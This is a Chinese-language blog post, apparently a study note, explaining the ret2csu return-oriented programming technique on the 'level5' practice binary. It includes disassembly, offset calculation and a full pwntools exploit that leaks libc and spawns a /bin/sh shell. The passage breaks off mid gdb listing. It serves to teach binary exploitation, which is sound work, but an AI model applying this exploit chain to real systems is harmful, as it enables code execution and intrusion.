<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Stack Overflow-中级ROP | HalloH's Blog</title><meta name="author" content="HalloH"><meta name="copyright" content="HalloH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Stack Overflow - 中级ROPret2csu原理 在64位程序中，函数的前六个参数是通过寄存器传递的，但是多数时候，不是很容易找到每一个寄存器对应的gadgets，这种情况下可以利用x64下的 __libc_csu_init 中的gadgets。 _libc_csu_init 一般来说，只要是调用了 libc.so 就会有这个函数来对 libc.so 进行初始化 rdi，rsi，rd">
<meta property="og:type" content="article">
<meta property="og:title" content="Stack Overflow-中级ROP">
<meta property="og:url" content="https://ha1loh.github.io/article/ef4f.html">
<meta property="og:site_name" content="HalloH&#39;s Blog">
<meta property="og:description" content="Stack Overflow - 中级ROPret2csu原理 在64位程序中，函数的前六个参数是通过寄存器传递的，但是多数时候，不是很容易找到每一个寄存器对应的gadgets，这种情况下可以利用x64下的 __libc_csu_init 中的gadgets。 _libc_csu_init 一般来说，只要是调用了 libc.so 就会有这个函数来对 libc.so 进行初始化 rdi，rsi，rd">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg">
<meta property="article:published_time" content="2023-07-15T06:01:09.000Z">
<meta property="article:modified_time" content="2023-12-22T06:13:46.238Z">
<meta property="article:author" content="HalloH">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg"><link rel="shortcut icon" href="/img/icon.png"><link rel="canonical" href="https://ha1loh.github.io/article/ef4f.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Stack Overflow-中级ROP',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-12-22 14:13:46'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="HalloH's Blog"><span class="site-name">HalloH's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Stack Overflow-中级ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-15T06:01:09.000Z" title="发表于 2023-07-15 14:01:09">2023-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-22T06:13:46.238Z" title="更新于 2023-12-22 14:13:46">2023-12-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Stack Overflow-中级ROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Stack-Overflow-中级ROP"><a href="#Stack-Overflow-中级ROP" class="headerlink" title="Stack Overflow - 中级ROP"></a>Stack Overflow - 中级ROP</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
<li>在64位程序中，函数的前六个参数是通过寄存器传递的，但是多数时候，不是很容易找到每一个寄存器对应的gadgets，这种情况下可以利用x64下的 <code>__libc_csu_init</code> 中的gadgets。 <strong>_libc_csu_init</strong> 一般来说，只要是调用了 libc.so 就会有这个函数来对 libc.so 进行初始化<ul>
<li>rdi，rsi，rdx，rcx，r8，r9用来传递函数的前六个参数，多于六个就放到栈里</li>
<li>libc包含了许多常见的函数：strcpy、strlen、strcmp、malloc、free、sprintf、scanf、printf、fopen、fclose、read、write等</li>
</ul>
</li>
</ul>
<p>这是一段<code>_libc_csu_init</code>函数的汇编指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005A0                               ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005A0                               public __libc_csu_init</span><br><span class="line">.text:00000000004005A0                               __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0                               var_30= qword ptr -30h</span><br><span class="line">.text:00000000004005A0                               var_28= qword ptr -28h</span><br><span class="line">.text:00000000004005A0                               var_20= qword ptr -20h</span><br><span class="line">.text:00000000004005A0                               var_18= qword ptr -18h</span><br><span class="line">.text:00000000004005A0                               var_10= qword ptr -10h</span><br><span class="line">.text:00000000004005A0                               var_8= qword ptr -8</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0                               ; __unwind &#123;</span><br><span class="line">.text:00000000004005A0 48 89 6C 24 D8                mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5 4C 89 64 24 E0                mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA 48 8D 2D 73 08 20 00          lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1 4C 8D 25 6C 08 20 00          lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8 4C 89 6C 24 E8                mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD 4C 89 74 24 F0                mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2 4C 89 7C 24 F8                mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7 48 89 5C 24 D0                mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC 48 83 EC 38                   sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0 4C 29 E5                      sub     rbp, r12</span><br><span class="line">.text:00000000004005D3 41 89 FD                      mov     r13d, edi</span><br><span class="line">.text:00000000004005D6 49 89 F6                      mov     r14, rsi</span><br><span class="line">.text:00000000004005D9 48 C1 FD 03                   sar     rbp, 3</span><br><span class="line">.text:00000000004005DD 49 89 D7                      mov     r15, rdx</span><br><span class="line">.text:00000000004005E0 E8 1B FE FF FF                call    _init_proc</span><br><span class="line">.text:00000000004005E0</span><br><span class="line">.text:00000000004005E5 48 85 ED                      test    rbp, rbp</span><br><span class="line">.text:00000000004005E8 74 1C                         jz      short loc_400606</span><br><span class="line">.text:00000000004005E8</span><br><span class="line">.text:00000000004005EA 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC 0F 1F 40 00                   nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005EC</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0                               loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0 4C 89 FA                      mov     rdx, r15</span><br><span class="line">.text:00000000004005F3 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:00000000004005F6 44 89 EF                      mov     edi, r13d</span><br><span class="line">.text:00000000004005F9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005F9</span><br><span class="line">.text:00000000004005FD 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400601 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604 75 EA                         jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400604</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606                               loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606 48 8B 5C 24 08                mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B 48 8B 6C 24 10                mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610 4C 8B 64 24 18                mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615 4C 8B 6C 24 20                mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A 4C 8B 74 24 28                mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F 4C 8B 7C 24 30                mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624 48 83 C4 38                   add     rsp, 38h</span><br><span class="line">.text:0000000000400628 C3                            retn</span><br><span class="line">.text:0000000000400628                               ; &#125; // starts at 4005A0</span><br><span class="line">.text:0000000000400628</span><br><span class="line">.text:0000000000400628                               __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<ul>
<li>可以利用的地方有：<ul>
<li>gadgets1：<ul>
<li>从0x0000000000400606 一直到0x000000000040061F，可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据，随着环境的不同，r13、r14、r15的顺序也可能会有所改变</li>
</ul>
</li>
<li>gadgets2：<ul>
<li>从 0x00000000004005F0 到 0x00000000004005F9，通过gadgets1中最后的ret，让程序流程走gadgets2，这样就可以将r15赋给rdx，将r14赋给rsi，将r13赋给edi（这里虽然赋给了edi，但是此时rdi的高32位值为0，所以可以控制rdi寄存器的值，不过只能控制低32位）。上述三个寄存也是x64函数调用中传递的前三个寄存器。所以如果可以合理地控制r12与rbx，那么就可以调用我们想要调用的函数。比如可以在gadgets1中控制rbx为0，call指令就可以跳转到r12寄存器存储的位置处，r12存储想要调用的函数地址</li>
<li>从 0x00000000004005FD 到 0x0000000000400604 ，判断是否与rbp相等，否则重新执行gadgets2。可以看出，能够通过控制rbx +1 &#x3D; rbp，这样就不会再重复执行loc_400600，可以设置 rbx&#x3D;0，rbp&#x3D;1</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>上面是IDA分析的level5，ctfwiki中的是另一种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>首先是gadgets1，mov指令变成了pop指令，gadgets中r13和r15的位置有些变化，功能是一样的，只需要在写payload时更改一下即可</p>
<h3 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：<a target="_blank" rel="noopener" href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5">ROP_STEP_BY_STEP&#x2F;linux_x64&#x2F;level5 at master · zhengmin1989&#x2F;ROP_STEP_BY_STEP · GitHub</a></p>
<p>检查安全保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序为64位，开启了堆栈不可执行保护，所以不能在栈中进行操作，IDA查看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>能够看到read函数，read函数不检查输入字符串长度，可以进行溢出。能够看到buf变量距离rsp是<code>0h</code>个字节，buf的起始地址就是sp的地址。buf变量距离rbp是<code>0x80</code>，那么也就是可控制的栈空间就是buf变量的起始地址到ebp的地址<code>0x80</code>个字节。因为是64位，所以ebp的位置还有8个字节，这样从变量的起始位置到ret返回有<code>0x80 + 0x8</code>个字节</p>
<p>更推荐利用GDB计算栈空间，之前遇到的题目直接<code>cyclic 200</code>然后计算就可以得到，但是在这道题目中是不能直接计算的</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221408475.png"></p>
<p>这是由于程序使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常，如果gdb中没有显示返回地址的话可以通过<code>x/x $rsp</code>来查看即将返回的地址，在这里能够看见rsp的返回地址所以可以直接计算，如上图，注意小端序，所以偏移的计算应该是<code>cyclic -l  0x6261616a</code>或<code>cyclic -l jaab</code>，计算结果为136</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221408469.png"></p>
<p>而IDA中并没有找到system和&#x2F;bin&#x2F;sh，需要自己构造，如果system不起作用的话，用execve也可以获取shell</p>
<p>构造payload思路：</p>
<ul>
<li>构建第一发payload，首先填充栈空间，将返回地址改为gadgets1，那么在gadgets1中利用寄存器部署三个参数，并且在最后调用write在got表中的地址进而调用write函数打印出write函数的地址，最后返回主main函数</li>
<li>第二发payload和第一发类似，不过要调用read函数</li>
<li>第三发调用是将bss段首地址和bss+8 ，即首地址的下八位地址（&#x2F;bin&#x2F;sh字符串）作为参数，只用到两个参数所以只需要用到r12和r13两个寄存器，其他寄存器使用0占位即可</li>
</ul>
<blockquote>
<p>write()会把参数buf所指的内存写入count个字节到参数放到所指的文件内，fd为文件描述符，fd为1时为标准输出</p>
</blockquote>
<p>payload图示（<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/pqc1nq#7Z8zh">Intermediate ROP (yuque.com)</a>）</p>
<p>第一发：</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221408942.png"></p>
<p>第二发：</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221409874.png"></p>
<p>第三发：</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221412348.png"></p>
<p>构建EXP思路：</p>
<ul>
<li>先获取write函数、read函数的got表地址，main函数和bss段的地址，然后进行第一次栈溢出，输出write函数地址</li>
<li>将输出的write函数地址接收，利用LibcSearch查找Libc版本并计算该版本Libc的基地址，进而查找到execve函数的地址，然后进行第二次栈溢出，利用read函数将execve和”&#x2F;bin&#x2F;sh”写入bss段</li>
<li>然后进行第三次栈溢出，调用bss段内的execve(‘&#x2F;bin&#x2F;sh’)</li>
</ul>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = level5.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_gadget = <span class="number">0x00000000004005F0</span></span><br><span class="line">csu_behind_gadget = <span class="number">0x0000000000400606</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">fill, rbx, rbp, r12, r13, r14, r15, main</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;hollkdig&#x27;</span> * <span class="number">17</span></span><br><span class="line">    payload += p64(csu_behind_gadget)</span><br><span class="line">    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_gadget)</span><br><span class="line">    payload += <span class="string">b&#x27;hollkdig&#x27;</span> * <span class="number">7</span></span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">&#x27;execve&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;execve_addr &#x27;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><ul>
<li><p>当允许输入的字节数较少时，可以考虑提前控制RBX和RBP，这样的话可以减少16字节</p>
</li>
<li><p>可以看到gadgets其实是两个部分，那么可以用两次调用，减少一次调用的字节数，但是需要有前提条件：</p>
<ul>
<li>漏洞可以多次触发</li>
<li>两次触发之间，r12-r15寄存器的值未被修改</li>
</ul>
</li>
<li><p>除了上面用到的gadgets，还有其他的函数也被编译进去了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure>

<p>此外可以将源程序中的一些地址进行偏移从而来获取我们想要的指令，确保程序不崩溃即可</p>
</li>
<li><p>libc_csu_init 的尾部通过偏移是可以控制其他寄存器的</p>
</li>
</ul>
<h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x/5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x/5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x/5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    